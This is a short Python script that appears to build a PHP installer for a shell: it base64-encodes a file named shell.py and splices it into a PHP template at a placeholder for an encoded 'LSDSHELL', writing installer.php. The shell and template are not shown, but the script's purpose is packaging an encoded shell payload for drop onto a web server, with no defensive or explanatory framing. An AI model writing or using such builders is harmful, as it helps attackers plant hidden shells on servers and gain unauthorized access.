#!/usr/bin/env python
shell = open("shell.py","r").read().encode("base64").replace("\r","").replace("\n","")
x = open("installertemplate.php", "r").read().replace("REPLACE ME WITH BASE64 ENCODED LSDSHELL",shell)
installer = open("installer.php","w")
installer.write(x)
